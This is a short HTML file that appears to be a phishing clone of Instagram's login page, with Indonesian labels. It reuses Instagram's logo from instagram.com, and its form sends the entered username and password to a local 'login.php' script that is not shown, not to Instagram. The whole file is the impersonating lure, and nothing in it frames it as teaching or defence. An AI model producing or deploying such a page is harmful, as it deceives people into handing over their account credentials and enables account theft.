<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body { background: #fafafa; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; }
        button { background: #0095f6; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
<div class="box">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="180">
    <form method="POST" action="login.php">
        <input type="text" name="username" placeholder="Nomor telepon, username, atau email" required>
        <input type="password" name="password" placeholder="Kata sandi" required>
        <button type="submit">Masuk</button>
    </form>
</div>
</body>
</html>
